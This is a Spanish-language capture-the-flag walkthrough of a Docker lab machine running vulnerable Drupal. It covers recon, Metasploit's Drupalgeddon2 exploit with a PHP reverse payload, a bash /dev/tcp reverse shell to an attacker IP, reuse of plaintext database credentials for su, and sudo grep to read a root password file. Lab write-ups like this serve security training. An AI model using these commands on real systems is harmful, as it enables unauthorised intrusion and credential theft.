# 🖥️ Máquina: FindYourStyle

Dificultad: Fácil
Entorno:Docker
Objetivo: Compromiso completo del sistema hasta root usando la vulneravilidad Drupal

---

## 📌 Descripción

La máquina **FindYourStyle** simula un entorno vulnerable basado en un CMS **Drupal** expuesto a través de un servicio web. El objetivo es identificar la superficie de ataque, explotar una vulnerabilidad crítica en el CMS y escalar privilegios hasta root mediante binarios con permisos SUID.

El vector principal de ataque es una vulnerabilidad en Drupal que permite **ejecución remota de código (RCE) sin autenticación**, lo que facilita el acceso inicial al sistema.

---

## 🖼️ Entorno

![Logo de Ejotapete](/FindYourStyle/Imagenes/Logo.png)

---

## 🚀 Despliegue de la máquina

Se inicia el entorno con el script proporcionado:

```bash
sudo bash auto_deploy.sh findyourstyle.tar
```

![Máquina iniciada](/FindYourStyle/Imagenes/despliegue.png)

---

## 🔎 Reconocimiento

### Conectividad

```bash
ping -c4 172.17.0.2
```

El análisis del **TTL** permite inferir el sistema operativo:

* TTL ≈ 64 → Linux
* TTL ≈ 128 → Windows

En este caso, el TTL corresponde a un sistema **Linux**.

---

### Escaneo de puertos

```bash
sudo nmap -p- --open -sS -n -Pn 172.17.0.2
```

Parámetros utilizados:

* `-p-` → todos los puertos
* `--open` → solo puertos abiertos
* `-sS` → SYN scan
* `-n` → sin resolución DNS
* `-Pn` → sin host discovery

Resultado:

* Puerto **80/tcp abierto (HTTP)**

Con el coamando:

```bash
sudo nmap -sCV -p80 172.17.0.2
```
Nos damos cuenta que esta corriendo el servicio grupal 8

![Página](/FindYourStyle/Imagenes/nmap.png)

---

## 🌐 Enumeración Web

Acceso inicial:

```
http://172.17.0.2
```

Se obtiene una pagina de grupal y ya vimos que trabaja con una version 8 que es vulnerable msfconsole.

![Página](/FindYourStyle/Imagenes/pagina.png)

---

### Fuzzing de directorios

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .env,.php,.bak,.old,.zip,.txt -b 403,404 --exclude-length 8068
```

Resultado:

![Fuzzing](/FindYourStyle/Imagenes/gobuster.png)

No hay algun directorio qu nos de alguna informaciòn util

---

## 🧠 Identificación de tecnología

```bash
whatweb http://172.17.0.2/
```

Se identifica:

* Apache desactualizado
* Drupal vulnerable

![Fuzzing](/FindYourStyle/Imagenes/whatweb.png)

---

## ⚠️ Vulnerabilidad

### CVE-2018-7600 (Drupalgeddon2)

### Explicación técnica

Esta vulnerabilidad se encuentra en el **Form API de Drupal**.
Debido a una validación insuficiente de entradas, es posible manipular estructuras internas del formulario para inyectar parámetros maliciosos.

Esto permite la ejecución de funciones PHP arbitrarias en el servidor, derivando en una **ejecución remota de código (RCE) sin autenticación**.

### Impacto

* Ejecución remota de comandos
* Compromiso total del servidor web
* Acceso inicial al sistema

---

## 💥 Explotación con Metasploit

### Preparación

```bash
rm -rf ~/.msf4
msfconsole
reload_all
```

### Selección del exploit

```bash
search drupal
use exploit/unix/webapp/drupal_drupalgeddon2
```

Este exploit es adecuado porque automatiza la explotación de la vulnerabilidad **Drupalgeddon2**, permitiendo ejecución remota sin autenticación.

---

### Configuración

```bash
set RHOSTS 172.17.0.2
set TARGETURI /drupal
set PAYLOAD php/reverse_php
set LHOST 192.168.0.108
set LPORT 4444
exploit
```

![Exploit](/FindYourStyle/Imagenes/configuracionmeta.png)

---

## 🐚 Shell inestable

La shell obtenida inicialmente es inestable debido a que PHP ejecuta comandos sin asignar una TTY completa, lo que limita:

* Control de procesos
* Interacción con terminal
* Uso de comandos avanzados

---

## 🔁 Reverse Shell estable

En atacante:

```bash
rlwrap nc -lvnp 4445
```

En víctima:

```bash
bash -c "bash -i >& /dev/tcp/192.168.0.108/4445 0>&1"
```

![Conexión](/FindYourStyle/Imagenes/escucha.png)

![Conexión](/FindYourStyle/Imagenes/victimaterminal.png)

---

# Escalada de privilegios básica desde `www-data` usando credenciales expuestas en Drupal

# Contexto inicial

La shell inicial mostraba:

```bash
www-data@2a7cd3faec1d:/var/www/html/sites/default$
```

Esto indica varias cosas:

| Elemento        | Explicación                                       |
| --------------- | ------------------------------------------------- |
| `www-data`      | Usuario típico utilizado por Apache/Nginx/PHP-FPM |
| `2a7cd3faec1d`  | Hostname con formato típico de contenedor Docker  |
| `/var/www/html` | Directorio clásico de aplicaciones web            |
| `sites/default` | Ruta característica de Drupal                     |

---

# Fase 1 — Enumeración inicial

La primera etapa en cualquier análisis es identificar:

* Usuario actual.
* Permisos.
* Archivos sensibles.
* Configuraciones.
* Credenciales.
* Variables de entorno.
* Servicios internos.

En este caso se comenzó revisando usuarios con shell válida.

## Enumeración de usuarios

Comando utilizado:

```bash
cat /etc/passwd | grep "/bin/bash"
```

Salida:

```bash
root:x:0:0:root:/root:/bin/bash
ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash
```

## Explicación

El archivo `/etc/passwd` contiene información de usuarios del sistema.

Formato:

```text
usuario:x:UID:GID:comentario:home:shell
```

Ejemplo:

```text
ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash
```

Desglose:

| Campo   | Valor             | Significado              |
| ------- | ----------------- | ------------------------ |
| Usuario | `ballenita`       | Nombre de usuario        |
| UID     | `1000`            | Identificador de usuario |
| GID     | `1000`            | Grupo principal          |
| Home    | `/home/ballenita` | Directorio personal      |
| Shell   | `/bin/bash`       | Shell interactiva        |

---

# Fase 2 — Identificación de la aplicación web

La ruta:

```bash
/var/www/html/sites/default
```

sugería inmediatamente un proyecto Drupal.

En Drupal, uno de los archivos más importantes es:

```bash
settings.php
```

Ubicado normalmente en:

```bash
sites/default/settings.php
```

Este archivo suele contener:

* Configuración del sitio.
* Credenciales de base de datos.
* Hosts internos.
* Prefijos.
* Parámetros sensibles.

---

# Fase 3 — Lectura de `settings.php`

Comando:

```bash
cat settings.php
```

Dentro del archivo aparecía:

```php
$databases['default']['default'] = array (
  'database' => 'database_under_beta_testing',
  'username' => 'ballenita',
  'password' => 'ballenitafeliz',
  'host' => 'localhost',
  'port' => '3306',
  'driver' => 'mysql',
);
```

---

# Análisis de seguridad

Aquí aparece el error crítico.

## Problema principal

La aplicación almacenaba credenciales en texto plano.

Esto es común en:

* Drupal
* WordPress
* Laravel
* Symfony
* Joomla
* aplicaciones PHP personalizadas

El verdadero problema NO es únicamente que existan credenciales.

El problema es:

## Reutilización de contraseñas

La contraseña:

```text
ballenitafeliz
```

no solo servía para MySQL.

También funcionaba para:

```bash
su ballenita
```

Eso significa que:

* La contraseña de base de datos fue reutilizada como contraseña del usuario Linux.
* No existía separación de credenciales.
* El principio de mínimo privilegio no se respetó.

---

# Fase 4 — Problema con `su`

Inicialmente apareció:

```bash
su: must be run from a terminal
```

## Esto pasa por:

`su` requiere una TTY interactiva.

Muchas shells web o shells reversas NO poseen:

* pseudo-terminal
* control de TTY
* stdin interactivo completo

Por eso `su` falla.

---

# TTY

TTY significa:

```text
TeleTYpewriter
```

En Linux representa una terminal interactiva real.

Programas como:

* `su`
* `sudo`
* `ssh`
* `passwd`

esperan interactuar con una terminal válida.

---

# Fase 5 — Conversión de shell limitada a shell interactiva

Se utilizó:

```bash
script /dev/null -c bash
```

Salida:

```bash
Script started, file is /dev/null
```

---

# ¿Qué hace `script`?

`script` crea una pseudo-terminal.

Normalmente sirve para:

* grabar sesiones
* generar logs de terminal
* ejecutar shells interactivas

Aquí se aprovechó para obtener una TTY funcional.

---

# ¿Por qué `/dev/null`?

Porque no interesa guardar la sesión.

Todo el contenido se descarta.

---

# Resultado

Después de ejecutar:

```bash
script /dev/null -c bash
```

el comando:

```bash
su ballenita
```

ya funcionó correctamente.

---

# Fase 6 — Cambio de usuario

Comando:

```bash
su ballenita
```

Contraseña:

```text
ballenitafeliz
```

Resultado:

```bash
ballenita@2a7cd3faec1d:/var/www/html$
```

---

# ¿Qué ocurrió técnicamente?

El proceso fue:

1. Shell inicial como `www-data`.
2. Enumeración de archivos sensibles.
3. Descubrimiento de credenciales.
4. Identificación de reutilización de contraseña.
5. Conversión a TTY interactiva.
6. Uso de `su`.
7. Escalada horizontal hacia otro usuario.

---

# Tipo de escalada

Esto NO es todavía root.

Es una:

## Escalada horizontal

Porque se pasó:

```text
www-data → ballenita
```

pero ambos siguen siendo usuarios no privilegiados.


![Conexión](/FindYourStyle/Imagenes/escaladauno.png)

![Conexión](/FindYourStyle/Imagenes/contraseñascat.png)

![Conexión](/FindYourStyle/Imagenes/ballenita.png)

---

# Fase final — Escalada a root

Después de obtener acceso como el usuario `ballenita`, se realizó una nueva enumeración del sistema buscando permisos elevados.

---

# Enumeración de privilegios sudo

Comando ejecutado:

```bash
sudo ls /root
```

Salida:

```bash
secretitomaximo.txt
```

---

# Explicación

El usuario `ballenita` tenía permisos para ejecutar ciertos comandos con `sudo`.

Eso permitió listar archivos dentro de:

```bash
/root
```

directorio normalmente accesible únicamente por `root`.

---

# Error inicial

Se intentó leer el archivo directamente:

```bash
cat secretitomaximo.txt
```

Resultado:

```bash
cat: secretitomaximo.txt: No such file or directory
```

---

# ¿Por qué ocurrió?

El archivo no estaba en el directorio actual.

La ruta correcta era:

```bash
/root/secretitomaximo.txt
```

---

# Uso de variable de entorno

Se almacenó la ruta en una variable:

```bash
LFILE=/root/secretitomaximo.txt
```

---

# Lectura del archivo usando sudo

Comando utilizado:

```bash
sudo grep '' $LFILE
```

Salida:

```text
nobodycanfindthispasswordrootrocks
```

---

# ¿Por qué funcionó `grep`?

El patrón:

```bash
''
```

es una expresión regular vacía.

Una regex vacía coincide con todas las líneas del archivo, por lo que `grep` termina imprimiendo todo el contenido.

En la práctica:

```bash
grep '' archivo
```

funciona como una lectura completa del archivo.

---

# Vulnerabilidad principal

El usuario podía ejecutar `grep` con privilegios elevados mediante `sudo`.

Eso permitió:

* leer archivos protegidos
* acceder a secretos
* extraer credenciales sensibles

---

# Obtención de acceso root

La contraseña encontrada fue utilizada con:

```bash
su root
```

Contraseña:

```text
nobodycanfindthispasswordrootrocks
```

Resultado:

```bash
root@2a7cd3faec1d:/var/www/html#
```

---

# Tipo de escalada

Esto corresponde a una:

## Escalada vertical

porque se pasó de un usuario normal a:

```text
root
```

![Conexión](/FindYourStyle/Imagenes/root.png)

---
